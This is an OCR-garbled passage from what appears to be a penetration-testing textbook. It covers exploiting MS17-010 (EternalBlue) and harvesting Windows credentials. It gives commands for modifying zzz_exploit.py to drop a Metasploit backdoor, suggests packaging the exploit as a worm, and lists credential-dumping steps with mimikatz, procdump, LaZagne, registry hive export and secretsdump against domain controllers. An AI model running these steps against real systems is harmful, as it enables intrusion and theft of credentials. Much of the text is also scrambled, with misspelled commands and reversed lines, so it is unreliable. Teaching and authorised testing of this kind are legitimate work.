- Host is 1ikety VULNERABLE to RS17010! - Kindows 5.1 x86 (32-bit)
Fig, 12.40 Result
snbConnconn.get_smbconnection()
print(creating file ci\pwned.txt on the target*)
fid2= smbConn.createFite(tidz,/pwned.txt')
#smbConn.disconnectTree(tid2)
Conn.closeFite(tid2,fid2)
snb_send_file(snbConn,*bind
ary generated by "nsfve
Fig, 12.41 Python code
X64, Windows 7 SP1 X86, Windows 2008 SP1 X86, Windows 2003 SP2 X86,
Windows XP SP3 X86, Windows 2000 SP4 X86.
Note that some systems will require authentication, which involves the consideration
about anonymous user (empty session) access to named pipes, since the default
configuration of newer versions of Windows restricts anonymous access. Starting
from Windows Vista, the default setting does not allow anonymous access to any
named pipes, and starting from Windows 8, the default setting does not allow
anonymous access to IPC $ shares.
The target machine is first scanned for the presence of Eternal Blue using scanner/
smb/smb_ms17_010, see Fig. 12.40.
Here we also recommend https://github.com/worawit/MS17-010, which is more
versatile, because the target version of the test is low, so use zzz_exploit.py, and
modify the smb_pwn function whose behavior defaults to create a TXT file on the C
drive, while we need to modify it to execute a command or upload an executable file,
as shown in Fig. 12.41.
Then, Metasploit is used to generate an executable file named bind86.exe and
places it in the script execution directory. At the same time, you should make
Metasploit begin to listens for backdoor connections (see Fig. 12.42), and then
executes the exploit script to get the target session.
This is just a demonstration of the use of zzz_exploit. It is recommended that the
 pons r m od o sem soo aosp o pduos d ou peau spen
writing it as an ms17010 worm, compiling it into an EXE file and propagating
automatically.
---
## Page 776
12.4 Obtaining Authentication Credentials
765
pythse zzz_exgteit-py 172.16.20.195
aned pipe: brovser
NS S.E
miaction
esactien se x36
smeter ceent to effrrefff to be able
to write b
Ta6748
txTa2t
writing tokes Use
Curreet setting R
ReqeiredDescrigtion
172.15.29.195
yloit terget!
1101x  172.16.20.1954
Fig, 12.42 Result
12.4Obtaining Authentication Credentials
Collecting intranet identity credentials is a prerequisite for lateral movement in
general, and lateral movement becomes more convenient when valid identity cre-
dentials are obtained. Here are some common methods to get Windows authentica-
tion credentials.
---
## Page 777
766
12 Virtual Target Penetration Test
12.4.1ObtainingPlaintextIdentityCredentials
Plaintext passwords are the most common identity credentials that users encounter in
everyday life. In the Windows authentication mechanism, many programs will save
the plaintext in various forms in the host. The following is a list of common methods
attackers use to obtain plaintext passwords.
12.4.1.1 LSA Secrets
LSA Secrets is a special protection mechanism used in the Windows Local Security
Authority (LSA) to store important user information, which acts as a local security
policy for the management system, responsible for auditing, authenticating, logging
users into the system, and storing private data. Sensitive user and system data are
stored in the LSA Secrets registry, which can only be accessed with system admin-
istrator privileges.
(1) LSA Secrets Location
LSA Secrets are stored in the system as a registry at (see Fig. 12.43):
HKEY_LOCAL_MACHINE/Security/Policy/Secrets., Its pemmissions is set to
allow only users in the system group to have all permissions.
When administrative access is added and the reopen. the regedit tool, the
subdirectory LSA Secrets will be displayed (see Fig. 12.44).
• SMACHINE.ACC: Information about domain authentication.
▪ DefaultPassword: Stores the encrypted password when autologon is on.
Fle Edit Vew Favorites Help
Permissions for SECURITY
N Corputer
seouty
Y,CASSSOO
 HKEY_CURRENT_USER
ALSYSTEM
HEY,LOCALMACHINE
BCD00000000
 HARDWARE
 SAM
SICURITY
SOFTWARE
 SYSTEM
Add
 HKEY,USERS
XSTSTEN
Alow
>L HY,CURINT_CONIG
Dey
FulContbrol
口口
口
Fig, 12.43 LSA Secrets
---
## Page 778
12.4 Obtaining Authentication Credentials
767
Fig, 12.44 LSA Secrets
HKEY_CLASSES_ROOT
HKEY_CURRENT_USER
HKEY_LOCAL_MACHINE
BCDO0000000
HARDWARE
SAM
SECURITY
l Cache
 Policy
Accounts
DefQuota
Domains
PolAcDmN
PolAcDmS
PolAdtEv
PolAdtLg
PolDnDDN
PolDnDmG
 PolDnTrN
PolEKList
PolOldSyskey
PolPrDmN
PolPrDmS
 PolRevision
 SecDese
 Secrets
>-2 SMACHINE.ACC
- DefaultPassword
DPAPI_SYSTEM
- NLSKM
RXACT
>SAM
• NLSKM: The key used to encrypt the cache domain password.
• LSRTMTIMEBOMB: Stores the date when the user was last active.
This location contains the password of the encrypted user. However, its key is stored
in the parent path Policy.
---
## Page 779
768
12  Virtual Target Penetration Test
11632
Fig, 12.45 Result
2. How to get a plaintext passwoed
(1) Simulate the scene and set up AutoLogon.
AutoLogon from the sysintemals tool suite makes it easy to set up AutoLogon
related information (see Fig. 12.45). See the web page at https://docs.microsoft.com/
en-us/sysintemals/downloads/autologon for more details.
(2) Copy registry entries
The registry entries that need to be copied are HKEY_LOCAL_MACHINEISAM,
HKEY_LOCAL_MACHINE\
SECURITY,
HKEY_LOCAL_MACHINE
SYSTEM.
Using the command that comes with the system to copy registry entries requires
administrator privileges), execute the following command.
C : \> reg - exe save hk1n\,san C: \,sam, save
C : \> reg - exe save hkc1n,security C: ^,security -save
C: \> reg -exe save hk1n\,systen C: ^systen. save
Place the three exported files into the Impacketiexamples folder and load them
using the Impacket secretsdump script.
save LOCAL
In the return result (see Fig. 12.46), you can see that the plaintext password
appears in the DefaultPassword entry. Other important items in the retum result will
be described later.
For more details about LSA, interested readers can go to MSDN to find out for
themselves:
https://docs.microsoff.com/
en-us/windows/desktop/secauthn/lsa-
authentication.
---
## Page 780
12.4 Obtaining Authentication Credentials
769
Fig, 12.46 Result
12.4.1.2 LSASS Process
LSASS (Local Security Authority Subsystem Service) is used to enforce Windows
system security policies. To support WDigest and SSP authentication, LSASS uses
patch KB2871997 to prevent abuse of this feature, but the patch only provides the
plaintext storage of user identity credentials. At the year of2016, Microsoft released
option to store plaintext passwords in memory or not, which is not a complete
defense against attacks. Windows Server 2012 R2-2016 disables WDigest by
default. its registry location is: HKEY_LOCAL_MACHINEICurrentControISet
ControlSecurityProviders\WDigest. if the value of UseLogonCredential is set to
0, then the plaintext password is not stored in memory, otherwise the plaintext
password would be stored in memory.
In fact, it is entirely possible for an attacker to modify its content when he has
sufficient privileges. When the value is successfully modified, the next time when
the user logs in, the new policy will be applied.
LSASS (Local Security Authentication Subsystem Service) is an internal pro-
st pue ssanond t se sxom pue sunu yeq uass Sueado smop op jo tens
responsible for the Windows system security policy.
LSASS runs as a process, and we need to get the memory of its processes. There
are two ways to do this.
(1) Using mimikatz
Use mimikatz to extract the password with the following command, the result of
which is shown in Fig. 12.47.
---
## Page 781
770
12  Virtual Target Penetration Test
00.90
m)
Fig, 12.47 Result
(2) Using procdump
Use procdump to dump the Isass process with the following command, the results of
which are shown in Fig. 12.48.
[9 privi1ege: :debug
# Upgrade to systen privileges
Mimikatz> ! +
 Load driver
Nimikatz> Iprocessprotect /process:1sass.exe /remove # Use the driver
to renove process protection
Mimikat.z> sekur1sa : : 1ogonpasswords
from nenory
# Extract the passvord
12.4.1.4 Credential Manager
Credential Manager stores Windows login credentials, such as username, password, 
and address, and Windows can save this data for later use on a local computer,
another computer on the same network, a server, or a Web site, etc. This data can be
used by Windows itself or by applications and programs such as File Explorer,
Microsoft Office, etc. (see Fig. 12.51).
It can be obtained directly using mimikatz (see Fig. 12.52).
Nimikatz> privi1ege: :debug
Nimikatz> sekur1sa: :credman
---
## Page 784
12.4 Obtaining Authentication Credentials
773
Fig, 12.51 Credential manager
inikatz  sekurlsalicrednar
30:0002dfea)
Teree
-100
0:0000fcd8)
-1
Fig, 12.52 Result
● Quiet mode (nothing willbe printed on the standard output)
laZagne-exe al1 -quiet -0A
Fig, 12.53 Demo
12.4.1.5Finding Credentials in a File with Lazange
Lazange is a great tool for collecting information for this machine. It tries to collect
credential information of multiple dimensions including browser, chat software,
database, games, Git, mail, Maven, memory, Wi-Fi, system credentials, and it
supports Windows, Linux, and Mac systems. See Fig. 12.53 for an explanation of
the command arguments. The results are shown in Fig. 12.54.
---
## Page 785
774
12 Virtual Target Penetration Test
Fig, 12.54 Result
12.4.2ObtainingHashIdentity Credentials
12.4.2.1  Obtaining Local User Hash Credentials from SAM Database
The SAM (Security Accounts Manager) database is where Windows system stores
local user identity credentials, and the credentials stored in the SAM database are in
NTLM Hash format. SAM is stored in the registry, the location is HKEY
o e ueo on p si sd s SNIHTO
from the database.
There are two specific ways of obtaining NTLM Hash.
1. Get NTLM Hash on the target machine.
Mimikatz commands as follows.
Mimikatz> privi1ege: :debug
Nimikatz> 1sadunp : :sam
Mimikatz> token: :elevate
2. Export the SAM database on the target machine and parse it locally.
soaud noensupe qm uu aq on pu spoa odxa Sumo a jo og
(1) Use the CMD command.
---
## Page 786
12.4 Obtaining Authentication Credentials
775
reg save HKLM`,sam san
reg save HKLM',system systen
(2) Using Powershell.
Powershell script needed is located at the following address: https://github.com
PowerShelIMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1. The
command is as follows.
Powershe11 >Invoke-NinjaCopy -Path *C: \windows^System32\config
\SYsTEM* -Loca1Destination *C :\windous^,cemp\aystem*
-Loca1DestinatLon *C:\windows\temp^san*
The NTLM Hash is then extracted locally from the SAM in two ways.
(1) Use Mimikatz with the following command.
Nimikat.z> 1sadump : :sam /sam: sam /system: system
(2) Use Impacket with the following command.
/stduexa/xaqsem/qota/1axoedut/dxogqanya.xmoas/moo qmqat6/ / :sdu
T0T ases wags/s uogs/s - 0nes*wes ues - Ad dunpssoxoos uoqa4
secretsdump·PY
12.4.2.2 Via Domain Controller's NTDS.dit File
Like SAM for the local machine, NTDS.dit is the database that holds the domain
user's identity credentials and is stored on the domain controller. The path is C:
Windows\System32ntds.dit in Windows Server 2019, and C:Windows'NTDS
VNTDS.dit in lower versions. After successfully obtaining administrator access on
a domain controller, the identity credentials of all users can be obtained, which can 
be used to maintain permissions in subsequent stages.
There are two ways to retrieve stored identity credentials.
1. Remote extraction
Use the secretsdump.py script from impacket to extract the password hash remotely
via desync with the following command.
secretsdump Py -just -dc administrator: P8ssvorde192 .168 . 40 .130
The results are shown in Fig. 12.55.
2. Local extraction
(1) Download ntds.dit to local, extract with impacket parsing
---
## Page 787
776
12 Virtual Target Penetration Test
Fig, 12.55 Result
PS D:\> Copy-VSS -DestinationDir C:\temp
copyok
copyok
copyok
nds
2019/3/13 17:37
12,288 K8
 sYST(M
 SAM
2019/4/8 22.02
64 X8
2019/4/12 12:22
17,408 K8
Fig, 12.56 Result in C:temp
Since ntds.dit needs to be parsed with the bootKey from SYSTEM, it is necessary to
download the SYSTEM file. these files cannot be copied directly, but we can copy
them using the VSS Volume Shadow script: https//github.com/samratashok/
nishang/blob/master/Gather/Copy-VSS.ps1.
This script copies SAM, SYSTEM, and ntds.dit directly to a user-controllable
location, see Fig. 12.56.